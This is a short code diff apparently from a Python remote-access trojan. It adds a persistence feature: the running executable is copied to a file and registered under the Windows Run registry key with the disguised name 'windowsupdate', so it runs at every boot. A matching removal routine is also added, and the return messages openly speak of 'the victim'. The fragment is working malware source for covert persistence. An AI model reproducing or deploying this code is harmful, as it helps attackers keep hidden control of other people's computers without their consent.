@@ -120,10 +120,14 @@ class mySocket():
             return "[+]Permanance is activated already."
         if not os.path.exists(self.tro_file):
             shutil.copyfile(sys.executable, self.tro_file)
+            regedit_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + self.tro_file
+            subprocess.call(regedit_command,shell=True)
             return "[+]Permanance activated."
 
     def Remove_Permanance(self):
         if os.path.exists(self.tro_file):
+            regedit_command = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /f"
+            subprocess.call(regedit_command,shell=True)
             os.remove(self.tro_file)
             return "[+]Permanance removed and it will not work every time the victim boots up his computer."
         else:
